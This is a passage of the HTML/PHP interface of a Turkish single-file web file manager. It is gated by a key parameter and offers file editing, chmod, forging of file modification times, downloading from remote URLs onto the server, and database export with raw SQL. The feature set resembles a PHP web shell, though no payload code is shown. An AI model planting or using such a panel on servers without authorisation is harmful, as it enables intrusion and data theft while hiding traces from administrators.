                <ul class="dropdown-menu dropdown-menu-fit-scroll" aria-labelledby="actionsMenu">
                    <li><a class="dropdown-item action-create-folder" href="#" data-bs-toggle="modal" data-bs-target="#createFolderModal"><i class="bi bi-folder-plus"></i> Yeni Klasör Oluştur</a></li>
                    <li><a class="dropdown-item action-create-file" href="#" data-bs-toggle="modal" data-bs-target="#createFileModal"><i class="bi bi-file-earmark-plus"></i> Yeni Dosya Oluştur</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-copy" href="#" data-bs-toggle="modal" data-bs-target="#copyModal" onclick="return setTopluActionValues('copy');"><i class="bi bi-files"></i> Kopyala</a></li>
                    <li><a class="dropdown-item action-delete" href="#" onclick="performTopluAction('delete')"><i class="bi bi-trash"></i> Sil</a></li>
                    <li><a class="dropdown-item action-download" href="#" onclick="performTopluAction('download')"><i class="bi bi-download"></i> İndir</a></li>
                    <li><a class="dropdown-item action-download-zip" href="#" onclick="openZipDownloadModal('download_zip')"><i class="bi bi-file-zip"></i> Seçilenleri Ziple İndir</a></li>
                    <li><a class="dropdown-item action-move" href="#" data-bs-toggle="modal" data-bs-target="#moveModal" onclick="return setTopluActionValues('move');"><i class="bi bi-arrows-move"></i> Taşı</a></li>
                    <li><a class="dropdown-item action-rename" href="#" data-bs-toggle="modal" data-bs-target="#renameModal" onclick="return setSingleActionValues('rename');"><i class="bi bi-pencil-square"></i> Yeniden Adlandır</a></li>
                    <li><a class="dropdown-item action-sunucuyaziple" href="#" onclick="performTopluAction('sunucuyaziple')"><i class="bi bi-file-earmark-zip"></i> SunucuyaZiple</a></li>
                    <li><a class="dropdown-item action-directzip" href="#" onclick="openZipDownloadModal('directzip')"><i class="bi bi-file-zip"></i> DirektZiple İndir</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-unzip" href="#" onclick="performTopluAction('unzip')"><i class="bi bi-file-zip-fill"></i> Zip'ten Çıkar</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-chmod" href="#" data-bs-toggle="modal" data-bs-target="#chmodModal" onclick="return setSingleActionValues('chmod');"><i class="bi bi-shield-lock"></i> İzinleri Düzenle</a></li>
                    <li><a class="dropdown-item action-touch" href="#" data-bs-toggle="modal" data-bs-target="#touchModal" onclick="return setSingleActionValues('touch');"><i class="bi bi-calendar-check"></i> Tarih/Saat Düzenle</a></li>
                </ul>
            </div>
            <div class="dropdown">
                <button class="btn btn-green btn-sm dropdown-toggle" type="button" id="toolsMenu" data-bs-toggle="dropdown" aria-expanded="false"><i class="bi bi-tools"></i> Araçlar</button>
                <ul class="dropdown-menu dropdown-menu-fit-scroll" aria-labelledby="toolsMenu">
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="bi bi-upload"></i> Yükle (Dosya/URL)</button></li>
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#databaseExportModal"><i class="bi bi-database"></i> Veri Tabanı</button></li>
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#encryptModal"><i class="bi bi-key"></i> Şifreleme</button></li>
                </ul>
            </div>
        </div>
        <div class="accordion mb-3" id="fileFilterAccordion">
            <div class="accordion-item">
                <h2 class="accordion-header" id="headingOne">
                    <button class="btn btn-sm btn-filter-group dropdown-toggle" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                        <i class="bi bi-funnel"></i> Dosya Filtreleme
                    </button>
                </h2>
                <div id="collapseOne" class="accordion-collapse collapse <?php echo $isRecursiveMode ? 'show' : ''; ?>" aria-labelledby="headingOne" data-bs-parent="#fileFilterAccordion">
                    <div class="accordion-body p-2">
                        <form method="get" class="row g-3">
                            <input type="hidden" name="key" value="<?php echo $KEY_PARAM; ?>">
                            <input type="hidden" name="dir" value="<?php echo encPath($currentDir); ?>">
                            <input type="hidden" name="sort" value="<?php echo htmlspecialchars($sort); ?>">
                            <input type="hidden" name="order" value="<?php echo htmlspecialchars($order); ?>">
                            <div class="col-auto">
                                <select class="form-select form-select-sm" id="range" name="range" onchange="toggleCustomDate(this.value)">
                                    <option value="original" <?php echo $timeRange === 'original' ? 'selected' : ''; ?>>Normal Gezinti (Tüm Dosyalar)</option>
                                    <option disabled>--- Son Güncellenen/Yüklenenler (Recursive) ---</option>
                                    <option value="today" <?php echo $timeRange === 'today' ? 'selected' : ''; ?>>Bugün</option>
                                    <option value="1day" <?php echo $timeRange === '1day' ? 'selected' : ''; ?>>Son 1 Gün Öncesi</option>
                                    <option value="3days" <?php echo $timeRange === '3days' ? 'selected' : ''; ?>>Son 3 Gün Öncesi</option>
                                    <option value="1week" <?php echo $timeRange === '1week' ? 'selected' : ''; ?>>Son 1 Hafta Öncesi</option>
                                    <option value="15days" <?php echo $timeRange === '15days' ? 'selected' : ''; ?>>Son 15 Gün Öncesi</option>
                                    <option value="1month" <?php echo $timeRange === '1month' ? 'selected' : ''; ?>>Son 1 Ay Öncesi</option>
                                    <option value="3months" <?php echo $timeRange === '3months' ? 'selected' : ''; ?>>Son 3 Ay Öncesi</option>
                                    <option value="6months" <?php echo $timeRange === '6months' ? 'selected' : ''; ?>>Son 6 Ay Öncesi</option>
                                    <option value="1year" <?php echo $timeRange === '1year' ? 'selected' : ''; ?>>Son 1 Yıl Öncesi</option>
                                    <option value="custom_date" <?php echo $timeRange === 'custom_date' ? 'selected' : ''; ?>>Tarih Seç (Özel)</option>
                                </select>
                            </div>
                            <div class="col-auto" id="date_custom_container">
                                <input type="date" class="form-control form-control-sm" name="date_custom" value="<?php echo htmlspecialchars($customDate); ?>" onchange="this.form.submit()">
                            </div>
                            <div class="col-auto">
                                <select class="form-select form-select-sm" id="content_filter" name="content_filter" onchange="this.form.submit()">
                                    <option value="all" <?php echo $contentFilter === 'all' ? 'selected' : ''; ?>>Tüm Dosya Uzantıları</option>
                                    <option disabled>---</option>
                                    <option value="php_extensions" <?php echo $contentFilter === 'php_extensions' ? 'selected' : ''; ?>>PHP Uzantıları</option>
                                    <option value="shells" <?php echo $contentFilter === 'shells' ? 'selected' : ''; ?>>Shelller (Yüksek Riskli Kodlar)</option>
                                    <option value="encrypted" <?php echo $contentFilter === 'encrypted' ? 'selected' : ''; ?>>Şifreli/Gizlenmiş Dosyalar (Hassas Kontrol)</option>
                                </select>
                            </div>
                            <div class="col-auto">
                                <button type="submit" class="btn btn-sm btn-primary">Filtrele</button>
                            </div>
                        </form>
                        <form method="get" class="mt-2" style="display: inline-block;">
                            <input type="hidden" name="key" value="<?php echo $KEY_PARAM; ?>">
                            <input type="hidden" name="dir" value="<?php echo encPath($currentDir); ?>">
                            <button type="submit" class="btn btn-sm btn-outline-danger"><i class="bi bi-x-circle"></i> Filtrelemeyi Kapat</button>
                        </form>
                        <p class="mt-2 mb-0 small text-muted">
                            <strong>Mod: 
                                <?php 
                                if (!$isRecursiveMode) {
                                    echo 'Normal (Gezinti)';
                                } else {
                                    $mode_desc = 'Recursive Arama Aktif';
                                    if ($isSearchContentRecursive) $mode_desc = 'İçerik Arama (Recursive)';
                                    echo $mode_desc;
                                }
                                ?>
                            </strong> 
                            &nbsp;|&nbsp; 
                            <strong>Zaman Aralığı: 
                                <?php echo getRangeDescription($timeRange, $isCustomRange, $customDate, $timeAgo); ?>
                            </strong>
                            &nbsp;|&nbsp; 
                            <strong>İçerik Filtresi: 
                                <?php echo getContentFilterDescription($contentFilter); ?>
                            </strong>
                            &nbsp;|&nbsp; 
                            <?php echo count($files); ?> öğe bulundu.
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <form method="GET" action="" class="mb-3" id="searchForm">
            <input type="hidden" name="dir" value="<?php echo encPath($currentDir); ?>">
            <input type="hidden" name="key" value="<?php echo $KEY_PARAM; ?>">
            <input type="hidden" name="action" value="search">
            <input type="hidden" name="mode" value="file_manager">
            <div class="input-group">
                <select class="form-select" name="search_type" id="searchTypeSelect" style="max-width: 150px;">
                    <option value="name" <?php echo $searchType === 'name' ? 'selected' : ''; ?>>Dosya Adı</option>
                    <option value="content" <?php echo $searchType === 'content' ? 'selected' : ''; ?>>İçerik Ara</option>
                </select>
                <input type="text" class="form-control" name="query" id="searchInput" placeholder="Ara..." value="<?php echo htmlspecialchars($searchTerm); ?>" oninput="handleSearchInput()">
                <button class="btn btn-primary" type="submit"><i class="bi bi-search"></i> Ara</button>
            </div>
        </form>
        <?php
            $linkParams = "&range=" . urlencode($timeRange) . ($isCustomRange ? '&date_custom=' . urlencode($customDate) : '') . "&content_filter=" . urlencode($contentFilter);
            $baseLink = "?dir=" . encPath($currentDir) . "&key=" . $KEY_PARAM . (!empty($searchTerm) ? "&action=search&query=" . urlencode($searchTerm) . "&search_type=" . urlencode($searchType) : "") . $linkParams;
            $newOrder = ($order === 'asc') ? 'desc' : 'asc';
        ?>
        <div class="table-responsive file-table-container">
            <table class="table table-hover table-striped table-bordered">
                <thead>
                    <tr>
                        <th style="width: 5%;"><input type="checkbox" id="selectAll" onclick="toggleFileSelection()" class="custom-checkbox-style"></th>
                        <th style="width: 35%;"><a href="<?php echo $baseLink . '&sort=name&order=' . ($sort=='name' ? $newOrder : 'asc'); ?>" class="sort-link">Ad <?php if($sort=='name') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th style="width: 10%;"><a href="<?php echo $baseLink . '&sort=size&order=' . ($sort=='size' ? $newOrder : 'asc'); ?>" class="sort-link">Boyut <?php if($sort=='size') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th style="width: 18%;"><a href="<?php echo $baseLink . '&sort=ctime&order=' . ($sort=='ctime' ? $newOrder : 'asc'); ?>" class="sort-link">GerçekTarih <?php if($sort=='ctime') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th style="width: 18%;"><a href="<?php echo $baseLink . '&sort=mtime&order=' . ($sort=='mtime' ? $newOrder : 'asc'); ?>" class="sort-link">Tarih <?php if($sort=='mtime') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                        <th style="width: 14%;"><a href="<?php echo $baseLink . '&sort=perms&order=' . ($sort=='perms' ? $newOrder : 'asc'); ?>" class="sort-link">İzinler <?php if($sort=='perms') echo ($order=='asc'?'<i class="bi bi-arrow-up"></i>':'<i class="bi bi-arrow-down"></i>'); ?></a></th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    $parentDir = dirname($currentDir); 
                    if (!$isRecursiveMode && empty($searchTerm) && realpath($parentDir) !== realpath($currentDir)) { 
                    ?>
                    <tr data-file-name=".." data-file-type="dir" data-perms="-" data-mtime="">
                        <td><input type="checkbox" name="file[]" value=".." onchange="updateFileSelection()" class="custom-checkbox-style"></td>
                        <td>
                            <i class="bi bi-folder-fill text-warning file-icon"></i>
                            <a href="?dir=<?php echo encPath($parentDir); ?>&key=<?php echo $KEY_PARAM; ?><?php echo $linkParams; ?>">..</a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                    </tr>
                    <?php } ?>
                    <?php 
                    foreach ($files as $file) { 
                        if ($file['type'] === 'dir' && $isRecursiveMode) continue; 
                        $isSelf = $file['name'] === $scriptName && !$isRecursiveMode;
                        $nameClass = $isSelf ? 'self-highlight' : '';
                        $fileUrl = getServerFileUrl($file['path']);
                        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
                        $isImage = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp']);
                        $fileSize = $file['type'] === 'dir' ? '-' : formatSize($file['size']);
                        $displayName = $isRecursiveMode || $isSearchContentRecursive ? $file['path'] : $file['name'];
                        $encodedPath = encPath($file['path']);
                    ?>
                    <tr data-file-name="<?php echo htmlspecialchars($file['name']); ?>" data-file-path="<?php echo htmlspecialchars($encodedPath); ?>" data-file-type="<?php echo $file['type']; ?>" data-perms="<?php echo $file['perms']; ?>" data-mtime="<?php echo $file['mtime'] ? date('Y-m-d H:i:s', $file['mtime']) : ''; ?>" data-ctime="<?php echo $file['ctime'] ? date('Y-m-d H:i:s', $file['ctime']) : ''; ?>" data-file-url="<?php echo htmlspecialchars($fileUrl); ?>">
                        <td><input type="checkbox" name="file[]" value="<?php echo htmlspecialchars($encodedPath); ?>" onchange="updateFileSelection()" class="custom-checkbox-style"></td>
                        <td>
                            <i class="<?php echo $file['icon']; ?> file-icon"></i>
                            <?php if ($file['type'] === 'dir' && !$isRecursiveMode) { ?>
                                <a href="?dir=<?php echo encPath($file['path']); ?>&key=<?php echo $KEY_PARAM; ?>" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } elseif ($file['type'] === 'file' && $isImage) { ?>
                                <a href="#" onclick="previewImage('<?php echo htmlspecialchars($fileUrl); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($displayName); ?></a>
                            <?php } elseif ($file['type'] === 'file') { ?>
                                <a href="#" onclick="openEditModal('<?php echo htmlspecialchars($encodedPath, ENT_QUOTES); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($displayName); ?></a>
                            <?php } else { ?>
                                <?php echo htmlspecialchars($displayName); 
                                } ?>
                        </td>
                        <td><?php echo $fileSize; ?></td>
                        <td><?php echo $file['ctime'] ? date('d.m.Y H:i', $file['ctime']) : '-'; ?></td>
                        <td><?php echo $file['mtime'] ? date('d.m.Y H:i', $file['mtime']) : '-'; ?></td>
                        <td><?php echo $file['perms']; ?></td>
                    </tr>
                    <?php } 
                    if (empty($files) && !$isRecursiveMode && empty($searchTerm)) { echo '<tr><td colspan="6" class="text-center">Dosya bulunamadı</td></tr>'; }
                    elseif (empty($files) && ($isRecursiveMode || !empty($searchTerm))) { echo '<tr><td colspan="6" class="text-center">Filtre/Arama kriterlerine uygun dosya bulunamadı.</td></tr>'; }
                    ?>
                </tbody>
            </table>
        </div>
        <div class="footer">Copyright © Exlonea - 2025</div>
        <div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="moveModalLabel"><i class="bi bi-arrows-move"></i> Taşı</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=move&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="moveForm">
                        <input type="hidden" name="files" id="moveFileNames">
                        <div class="modal-body">
                            <p><span id="moveFileCount" class="fw-bold">0</span> dosya/klasör taşınacak.</p>
                            <label for="moveDestination" class="form-label">Hedef Dizin (Tam Yolu)</label>
                            <input type="text" name="destination" id="moveDestination" class="form-control" placeholder="/var/www/html/yeni_hedef">
                            <div id="moveLastPathContainer" class="last-path-container" style="display:none;">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" value="" id="useLastPathMove" onchange="applyLastPath('move')">
                                    <label class="form-check-label" for="useLastPathMove">
                                        <i class="bi bi-clipboard"></i> Son Kopyalanan Adresi Kullan: <span class="last-path-text" id="lastPathDisplayMove"></span>
                                    </label>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Taşı</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="copyModal" tabindex="-1" aria-labelledby="copyModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="copyModalLabel"><i class="bi bi-files"></i> Kopyala</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=copy&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="copyForm">
                        <input type="hidden" name="files" id="copyFileNames">
                        <div class="modal-body">
                            <p><span id="copyFileCount" class="fw-bold">0</span> dosya/klasör kopyalanacak.</p>
                            <label for="copyDestination" class="form-label">Hedef Dizin (Tam Yolu)</label>
                            <input type="text" name="destination" id="copyDestination" class="form-control" placeholder="/var/www/html/yeni_hedef">
                            <div id="copyLastPathContainer" class="last-path-container" style="display:none;">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" value="" id="useLastPathCopy" onchange="applyLastPath('copy')">
                                    <label class="form-check-label" for="useLastPathCopy">
                                        <i class="bi bi-clipboard"></i> Son Kopyalanan Adresi Kullan: <span class="last-path-text" id="lastPathDisplayCopy"></span>
                                    </label>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Kopyala</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-xl" id="editModalDialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <div class="modal-header-custom">
                            <h5 class="modal-title modal-title-custom" id="editModalLabel"><i class="bi bi-code-square"></i> Düzenle: <span id="modalFileName" class="text-primary desktop-filename"></span><span class="mobile-filename-info"><button type="button" class="btn btn-sm btn-link p-0 ms-1" id="mobileFileInfoBtn" title="Dosya Adı"><i class="bi bi-info-circle text-primary"></i></button></span></h5>
                            <div class="modal-actions-custom">
                                <button type="button" class="btn btn-sm btn-outline-info" id="fullscreenToggleBtn" title="Tam Ekran"><i class="bi bi-arrows-fullscreen"></i></button>
                                <button type="button" class="btn btn-sm btn-outline-info" onclick="editor.setValue('');" title="Temizle"><i class="bi bi-eraser"></i></button>
                                <button type="button" class="btn btn-sm btn-outline-info" onclick="editor.setTheme('ace/theme/chrome');" title="Light"><i class="bi bi-sun"></i></button>
                                <button type="button" class="btn btn-sm btn-outline-info" onclick="editor.setTheme('ace/theme/monokai');" title="Dark"><i class="bi bi-moon"></i></button>
                                <a id="headerFileUrl" href="#" target="_blank" class="btn btn-sm btn-outline-info" title="URL'ye Git"><i class="bi bi-link-45deg"></i></a>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                            </div>
                        </div>
                    </div>
                    <form method="POST" id="editForm" action="?action=edit&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="file" id="editFileName">
                        <div class="modal-body">
                            <div style="display:none;">
                                <span id="filePermsDisplay" class="fw-bold"></span>
                                <span id="fileMTimeDisplay" class="fw-bold"></span>
                                <a id="fileUrlDisplay"></a>
                            </div>
                            <div id="editor"></div>
                            <textarea name="content" id="fileContent" style="display: none;"></textarea>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-danger" data-bs-dismiss="modal"><i class="bi bi-x-lg"></i> İptal</button>
                            <button type="submit" class="btn btn-success"><i class="bi bi-save"></i> Kaydet</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="previewModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content bg-dark">
                    <div class="modal-body text-center p-0">
                        <img id="previewImage" src="" alt="Önizleme">
                    </div>
                    <div class="modal-footer border-0">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Kapat</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="createFolderModalLabel"><i class="bi bi-folder-plus"></i> Yeni Klasör Oluştur</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=create_folder&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body"><input type="text" name="folder_name" class="form-control" placeholder="Klasör Adı" required></div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Oluştur</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="createFileModalLabel"><i class="bi bi-file-earmark-plus"></i> Yeni Dosya Oluştur</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=create_file&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body"><input type="text" name="file_name" class="form-control" placeholder="Dosya Adı (Örn: index.php)" required></div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Oluştur & Düzenle</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="renameModalLabel"><i class="bi bi-pencil-square"></i> Yeniden Adlandır</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=rename&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="renameForm">
                        <input type="hidden" name="old_name" id="renameOldName">
                        <div class="modal-body">
                            <p>Eski Ad: <span id="renameOldNameDisplay" class="fw-bold"></span></p>
                            <label for="renameNewName" class="form-label">Yeni Ad</label>
                            <input type="text" name="new_name" id="renameNewName" class="form-control" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Adlandır</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="chmodModalLabel"><i class="bi bi-shield-lock"></i> İzinleri Düzenle (CHMOD)</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=chmod&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="chmodForm">
                        <input type="hidden" name="file" id="chmodFileName">
                        <div class="modal-body">
                            <p>Dosya: <span id="chmodFileNameDisplay" class="fw-bold"></span></p>
                            <p>Mevcut İzin: <span id="chmodOldPerms" class="fw-bold"></span></p>
                            <label for="chmodNewPerms" class="form-label">Yeni İzin (Oktal - Örn: 0777, 0644)</label>
                            <input type="text" name="perms" id="chmodNewPerms" class="form-control" pattern="0[0-7]{3}" maxlength="4" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Uygula</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="touchModal" tabindex="-1" aria-labelledby="touchModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="touchModalLabel"><i class="bi bi-calendar-check"></i> Tarih/Saat Düzenle</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=touch&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="touchForm">
                        <input type="hidden" name="file" id="touchFileName">
                        <div class="modal-body">
                            <p>Dosya: <span id="touchFileNameDisplay" class="fw-bold"></span></p>
                            <p>Mevcut Tarih/Saat: <span id="touchOldMtime" class="fw-bold"></span></p>
                            <label for="touchNewMtime" class="form-label">Yeni Tarih/Saat</label>
                            <input type="datetime-local" name="mtime" id="touchNewMtime" class="form-control" step="1" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Uygula</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div class="modal fade" id="uploadModal" tabindex="-1" aria-labelledby="uploadModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="uploadModalLabel"><i class="bi bi-upload"></i> Dosya Yükle / URL'den İndir</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" id="createFolderToggle" onchange="toggleFolderCreation()">
                                <label class="form-check-label" for="createFolderToggle">Klasör Oluştur ve İçine Yükle</label>
                            </div>
                            <div id="folderNameInput" style="display:none;" class="mt-2">
                                <input type="text" class="form-control" id="uploadFolderName" placeholder="Klasör Adı" oninput="updateUploadFolderInputs()">
                            </div>
                        </div>
                        <ul class="nav nav-tabs" id="uploadTab" role="tablist">
                            <li class="nav-item" role="presentation"><button class="nav-link active" id="file-tab" data-bs-toggle="tab" data-bs-target="#file-upload" type="button" role="tab"><i class="bi bi-file-earmark-arrow-up"></i> Dosya Yükle</button></li>
                            <li class="nav-item" role="presentation"><button class="nav-link" id="url-tab" data-bs-toggle="tab" data-bs-target="#url-download" type="button" role="tab"><i class="bi bi-link-45deg"></i> URL'den İndir</button></li>
                        </ul>
                        <div class="tab-content pt-3">
                            <div class="tab-pane fade show active" id="file-upload" role="tabpanel">
                                <form method="POST" action="?action=upload&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data" id="fileUploadForm">
                                    <input type="hidden" name="upload_type" value="file">
                                    <input type="hidden" name="create_folder_on_upload" id="fileUploadFolderFlag" value="no">
                                    <input type="hidden" name="upload_folder_name" id="fileUploadFolderName" value="">
                                    <div class="mb-3">
                                        <label for="uploadedFiles" class="form-label">Dosya(ları) Seçin</label>
                                        <input class="form-control" type="file" id="uploadedFiles" name="uploaded_files[]" multiple required>
                                    </div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-upload"></i> Yükle</button>
                                </form>
                            </div>
                            <div class="tab-pane fade" id="url-download" role="tabpanel">
                                <form method="POST" action="?action=upload&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="urlUploadForm">
                                    <input type="hidden" name="upload_type" value="url">
                                    <input type="hidden" name="create_folder_on_upload" id="urlUploadFolderFlag" value="no">
                                    <input type="hidden" name="upload_folder_name" id="urlUploadFolderName" value="">
                                    <div class="mb-3">
                                        <label for="urls" class="form-label">URL'leri Girin (Her satıra bir tane)</label>
                                        <textarea class="form-control" id="urls" name="urls" rows="5" placeholder="https://example.com/dosya.zip&#10;https://another.com/image.jpg" required></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-download"></i> İndir</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade db-export-modal" id="databaseExportModal" tabindex="-1" aria-labelledby="databaseExportModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-xl">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title" id="databaseExportModalLabel"><i class="bi bi-database"></i> Veri Tabanı Araçları</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <ul class="nav nav-tabs mb-3" id="dbTab" role="tablist">
                            <li class="nav-item"><button class="nav-link active" id="export-tab" data-bs-toggle="tab" data-bs-target="#db-export" type="button">Dışa Aktar (Export)</button></li>
                            <li class="nav-item"><button class="nav-link" id="import-tab" data-bs-toggle="tab" data-bs-target="#db-import" type="button">İçe Aktar (Import)</button></li>
                            <li class="nav-item"><button class="nav-link" id="advanced-db-tab" data-bs-toggle="tab" data-bs-target="#db-advanced" type="button">Gelişmiş Yönetim / SQL</button></li>
                        </ul>
                        <div class="tab-content">
                            <div class="tab-pane fade show active" id="db-export">
                                <form method="POST" action="?action=database_export&dir=<?php echo encPath($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                                    <div class="mb-2"><input type="text" name="host" class="form-control" value="localhost" placeholder="Host" required></div>
                                    <div class="mb-2"><input type="text" name="user" class="form-control" placeholder="Kullanıcı Adı" required></div>
